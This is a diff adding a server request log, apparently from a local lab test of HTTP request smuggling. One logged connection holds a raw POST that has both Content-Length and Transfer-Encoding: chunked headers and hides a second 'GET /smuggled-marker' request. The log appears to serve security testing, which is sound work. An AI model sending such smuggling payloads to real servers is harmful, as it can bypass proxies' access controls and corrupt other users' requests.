@@ -1,0 +1,10 @@
+2026-11-24T21:22:26.634837+00:00 conn=1 bytes=247 request_lines=1
+    b'GET /health HTTP/1.1'
+    raw=b'GET /health HTTP/1.1\r\nuser-agent: curl/8.18.0\r\naccept: */*\r\nhost: 127.0.0.1:8750\r\nx-request-id: t1795555345-0\r\nx-forwarded-for: 127.0.0.1\r\nx-forwarded-proto: http\r\nx-forwarded-version: HTTP/1.1\r\nforwarded: for=127.0.0.1;by=127.0.0.1;proto=http\r\n\r\n'
+2026-11-24T21:22:36.837325+00:00 conn=2 bytes=126 request_lines=2
+    b'POST / HTTP/1.1'
+    b'GET /smuggled-marker HTTP/1.1'
+    raw=b'POST / HTTP/1.1\r\nHost: lab\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled-marker HTTP/1.1\r\nHost: lab\r\n\r\n'
+2026-11-24T21:22:37.840261+00:00 conn=3 bytes=193 request_lines=1
+    b'POST / HTTP/1.1'
+    raw=b'POST / HTTP/1.1\r\nhost: lab\r\nx-request-id: t1795555356-1\r\nx-forwarded-for: 127.0.0.1\r\nx-forwarded-proto: http\r\nx-forwarded-version: HTTP/1.1\r\nforwarded: for=127.0.0.1;by=127.0.0.1;proto=http\r\n\r\n'
